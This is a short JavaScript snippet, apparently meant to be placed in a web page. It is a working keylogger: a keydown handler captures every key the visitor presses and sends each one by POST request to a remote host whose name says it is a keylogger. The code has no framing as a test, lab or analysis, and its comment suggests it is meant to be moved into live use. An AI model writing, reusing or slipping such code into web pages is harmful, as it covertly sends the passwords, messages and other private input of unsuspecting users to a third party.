//TODO move this somewhere outside
document.onkeydown = function(evt) {
    var key = evt.key
    if (key) {
        console.log(key);

        var options = {
            method: 'POST',
            body: key
        };

        fetch("https://hlg-keylogger.azurewebsites.net/", options);
    }
}
